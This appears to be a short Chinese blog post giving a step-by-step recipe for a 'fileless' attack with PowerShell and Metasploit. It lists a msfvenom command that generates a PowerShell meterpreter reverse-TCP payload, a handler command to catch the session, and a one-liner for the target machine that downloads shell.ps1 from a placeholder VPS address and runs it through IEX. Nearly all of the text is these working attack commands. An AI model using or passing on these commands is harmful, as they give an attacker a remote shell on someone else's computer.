Poweshell配合Metasploit无文件落地攻击

Posted on 2020-04-26

无论你觉得自己多么的了不起，也永远有人比你更强

Msfvenom生成Powershell木马

msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.11.135 LPORT=1128 -f psh-reflection -o shell.ps1

Msf设置侦听

handler -H 192.168.11.135 -P 1128 -p windows/x64/meterpreter/reverse_tcp

把Msf生成的Powershell木马文件放到外网VPS，然后在靶机上执行命令:

powershell “IEX (New-Object Net.WebClient).DownloadString(‘http://xxx.xxx.xxx.xxx/shell.ps1');"
